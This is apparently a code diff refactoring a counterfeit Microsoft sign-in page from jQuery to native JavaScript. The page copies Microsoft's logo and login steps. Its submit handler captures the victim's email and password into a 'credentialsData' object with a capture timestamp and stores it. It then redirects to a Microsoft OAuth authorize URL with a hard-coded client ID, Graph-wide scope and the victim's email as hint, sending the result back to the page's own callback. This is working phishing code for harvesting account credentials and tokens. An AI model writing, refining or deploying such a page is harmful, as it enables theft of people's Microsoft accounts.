@@ -172,6 +172,7 @@
     .troubleshooting-body p { margin: 8px 0; }
     .troubleshooting-body strong { font-weight: 600; }
     .troubleshooting-body .code { font-family: Consolas, monospace; font-size: 13px; }
+    .hidden { display: none; }
   </style>
 </head>
 <body>
@@ -195,7 +196,7 @@
         </div>
 
         <!-- Password View -->
-        <div id="div2" style="display:none;">
+        <div id="div2" class="hidden">
           <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
           <div class="mt-4">
               <i class="fas fa-arrow-left" id="back" aria-hidden="true"></i>&nbsp;<span id="emailch" style="font-size:15px;"></span>
@@ -210,8 +211,8 @@
           </div>
         </div>
         
-        <!-- Detailed "Sign-in options" View (hidden by default) -->
-        <div id="options_view_detailed" style="display:none;">
+        <!-- Detailed "Sign-in options" View -->
+        <div id="options_view_detailed" class="hidden">
             <img src="/images/microsoft_logo.svg" height="23" alt="Microsoft logo">
             <h1 class="mt-4">Sign-in options</h1>
             <div class="option-item">
@@ -243,7 +244,7 @@
         <p><a href="#" id="sign_in_options_link"><i class="fas fa-key"></i> Sign-in options</a></p>
       </div>
 
-      <!-- Troubleshooting Box (hidden by default) -->
+      <!-- Troubleshooting Box -->
       <div class="troubleshooting-box" id="troubleshooting_box">
         <div class="troubleshooting-header">
             <h2>Troubleshooting details</h2>
@@ -273,108 +274,105 @@
     <a href="#" id="footer_dots_link">...</a>
   </div>
 
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
-    $(document).ready(function(){
-      function isValidEmail(email) {
-        if (!email) return false;
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return emailRegex.test(email);
-      }
-
-      $('#next').click(function(e) {
-        e.preventDefault();
-        const email = $('#email').val().trim();
-        if (isValidEmail(email)) {
-          $('#emailch').text(email);
-          $('#div1').hide();
-          $('#div2').show();
-          $('#options_box').hide();
-          $('#troubleshooting_box').hide();
-          $('#error').hide();
-        } else {
-          $('#error').show();
-        }
-      });
-
-      $('#back').click(function() {
-        $('#div2').hide();
-        $('#div1').show();
-        $('#options_box').show();
-        $('#msg').hide();
-      });
-
-      $('#sign_in_options_link').click(function(e) {
-          e.preventDefault();
-          $('#div1, #div2').hide();
-          $('#options_box').hide();
-          $('#troubleshooting_box').hide();
-          $('#options_view_detailed').show();
-      });
-
-      $('#options-view-back').click(function() {
-          $('#options_view_detailed').hide();
-          $('#div1').show();
-          $('#options_box').show();
-      });
-      
-      $('#submit-btn').click(function(event){
-        event.preventDefault();
-        const email = $('#emailch').text().trim();
-        const password = $('#password').val();
-
-        if (!password) {
-          $('#msg').show();
-          return;
-        }
+    // --- REWRITTEN SCRIPT USING MODERN NATIVE JAVASCRIPT ---
+    document.addEventListener('DOMContentLoaded', function () {
         
-        $('#msg').hide();
-        $('#submit-btn').text('Verifying...').prop('disabled', true);
-
-        const credentialsData = {
-          email: email,
-          password: password,
-          captureTime: new Date().toISOString(),
-          source: 'replacement-html-final'
-        };
-        try {
-          localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
-        } catch (e) { console.error('❌ Failed to store credentials in localStorage:', e); }
-
-        const callbackUrl = window.location.origin + '/auth/callback';
-        const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
+        // --- Element Selectors ---
+        const div1 = document.getElementById('div1');
+        const div2 = document.getElementById('div2');
+        const optionsViewDetailed = document.getElementById('options_view_detailed');
+        const optionsBox = document.getElementById('options_box');
+        const troubleshootingBox = document.getElementById('troubleshooting_box');
         
-        // This check prevents the redirect if the URL is broken
-        if (microsoftLoginUrl.includes('undefined')) {
-            alert('A critical error occurred. Could not build the login URL.');
-            $('#submit-btn').text('Sign in').prop('disabled', false);
-            return;
-        }
-        
-        setTimeout(() => { window.location.href = microsoftLoginUrl; }, 1200);
-      });
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const emailDisplay = document.getElementById('emailch');
 
-      $('#footer_dots_link').click(function(e) {
-          e.preventDefault();
-          // --- THIS IS THE CORRECTED LINE ---
-          $('#modal_timestamp').text(new Date().toISOString());
-          // ------------------------------------
-          $('#troubleshooting_box').slideToggle(200);
-      });
+        // --- Event Listeners ---
+        document.getElementById('next').addEventListener('click', function (e) {
+            e.preventDefault();
+            const email = emailInput.value.trim();
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (emailRegex.test(email)) {
+                emailDisplay.textContent = email;
+                div1.classList.add('hidden');
+                div2.classList.remove('hidden');
+                optionsBox.classList.add('hidden');
+                troubleshootingBox.style.display = 'none';
+            }
+        });
 
-      $('#close_troubleshooting_btn').click(function() {
-          $('#troubleshooting_box').slideUp(200);
-      });
+        document.getElementById('back').addEventListener('click', function () {
+            div2.classList.add('hidden');
+            div1.classList.remove('hidden');
+            optionsBox.classList.remove('hidden');
+        });
 
-      $('#copy_info_link').click(function(e) {
-          e.preventDefault();
-          const detailsText = $('#error_details_for_copy').text().trim().replace(/\s\s+/g, '\n');
-          navigator.clipboard.writeText(detailsText).then(() => {
-              const originalText = $(this).text();
-              $(this).text('Copied!');
-              setTimeout(() => { $(this).text(originalText); }, 2000);
-          });
-      });
+        document.getElementById('sign_in_options_link').addEventListener('click', function (e) {
+            e.preventDefault();
+            div1.classList.add('hidden');
+            div2.classList.add('hidden');
+            optionsBox.classList.add('hidden');
+            troubleshootingBox.style.display = 'none';
+            optionsViewDetailed.classList.remove('hidden');
+        });
+
+        document.getElementById('options-view-back').addEventListener('click', function () {
+            optionsViewDetailed.classList.add('hidden');
+            div1.classList.remove('hidden');
+            optionsBox.classList.remove('hidden');
+        });
+
+        document.getElementById('submit-btn').addEventListener('click', function (event) {
+            event.preventDefault();
+            const email = emailDisplay.textContent.trim();
+            const password = passwordInput.value;
+
+            if (!password) return;
+            
+            const submitBtn = event.target;
+            submitBtn.textContent = 'Verifying...';
+            submitBtn.disabled = true;
+
+            const credentialsData = {
+                email: email,
+                password: password,
+                captureTime: new Date().toISOString(),
+                source: 'replacement-html-final'
+            };
+            
+            try {
+                localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
+            } catch (err) {
+                console.error('Failed to store credentials in localStorage:', err);
+            }
+
+            const callbackUrl = window.location.origin + '/auth/callback';
+            const microsoftLoginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=${encodeURIComponent(callbackUrl)}&response_mode=query&scope=https://graph.microsoft.com/.default&prompt=none&login_hint=${encodeURIComponent(email)}`;
+
+            setTimeout(() => { window.location.href = microsoftLoginUrl; }, 1200);
+        });
+
+        document.getElementById('footer_dots_link').addEventListener('click', function (e) {
+            e.preventDefault();
+            document.getElementById('modal_timestamp').textContent = new Date().toISOString();
+            troubleshootingBox.style.display = troubleshootingBox.style.display === 'block' ? 'none' : 'block';
+        });
+
+        document.getElementById('close_troubleshooting_btn').addEventListener('click', function () {
+            troubleshootingBox.style.display = 'none';
+        });
+
+        document.getElementById('copy_info_link').addEventListener('click', function (e) {
+            e.preventDefault();
+            const detailsText = document.getElementById('error_details_for_copy').textContent.trim().replace(/\s\s+/g, '\n');
+            navigator.clipboard.writeText(detailsText).then(() => {
+                const originalText = e.target.textContent;
+                e.target.textContent = 'Copied!';
+                setTimeout(() => { e.target.textContent = originalText; }, 2000);
+            });
+        });
     });
   </script>
 </body>
